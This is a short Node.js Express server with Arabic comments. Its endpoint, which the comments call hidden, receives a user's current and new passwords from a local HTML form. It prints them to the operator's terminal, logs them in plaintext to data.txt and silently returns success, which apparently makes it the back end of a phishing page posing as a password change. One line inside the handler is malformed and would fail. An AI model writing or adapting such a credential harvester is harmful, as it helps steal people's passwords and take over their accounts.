// استدعاء المكتبات البرمجية الأساسية لإنشاء السيرفر
const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// تفعيل الصلاحيات لكي يستقبل السيرفر البيانات القادمة من ملف الـ HTML المحلي
app.use(cors());
app.use(express.json());

// الرابط البرمجي المخفي الذي يستقبل البيانات من الواجهة
app.post('/api/save', (req, res) => {
    const data = req.body;

    // 1. طباعة البيانات فوراً في شاشتك السوداء (Terminal) لتراقبها بنفسك
    console.log("=== تم استقبال بيانات جديدة ===");
    console.log("كلمة المرور الحالية:", data.current);
    console.log("كلمة المرور الجديدة:", data.new);
    console.log("تأكيد كلمة المرور:", data.confirm);
    console.log("================================\n");

    // 2. تنسيق البيانات لحفظها في ملف نصي بشكل منظم
    const logData = `[${new Date().toLocaleString()}] -> Current: ${data.current} | New: ${data.new} | Confirm: ${data.confirm}\n`;

    // 3. كتابة البيانات داخل ملف اسمه data.txt (سيتم إنشاؤه تلقائياً بجانب السيرفر)
    fs.appendFileSync('data.txt', logData, 'utf8');

    // إرسال إشارة نجاح صامتة للمتصفح (رمز 200 تعني OK)
    res.sendStatus(200);
    app.use.express.static('public');
});

// تشغيل السيرفر وجعله مستعداً للاستقبال
app.listen(PORT, () => {
    console.log(`السيرفر المحلي يعمل الآن بنجاح على الرابط: http://localhost:${PORT}`);
    console.log('اضغط Ctrl + C في الشاشة السوداء لإيقاف السيرفر في أي وقت.');
});
